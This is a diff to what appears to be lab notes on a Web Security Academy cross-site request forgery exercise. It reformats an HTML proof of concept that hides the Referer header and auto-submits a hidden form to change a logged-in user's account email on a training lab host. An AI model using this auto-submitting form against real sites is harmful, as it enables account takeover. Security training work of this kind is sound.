@@ -51,16 +51,16 @@ Cross-Site Request Forgery (CSRF)
 ```html
 <html>
 <head>
-<meta name="referrer" content="no-referrer">
+  <meta name="referrer" content="no-referrer">
 </head>
-<body>
-<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
-<input type="hidden" name="email" value="attacker@example.com">
-</form>
-<script>
-document.forms[0].submit();
-</script>
-</body>
+  <body>
+    <form action="https://0a14001c04cc5c81813dcfcd002d00af.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="xxyz&#64;gmail&#46;com" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
 </html>
 ```
 
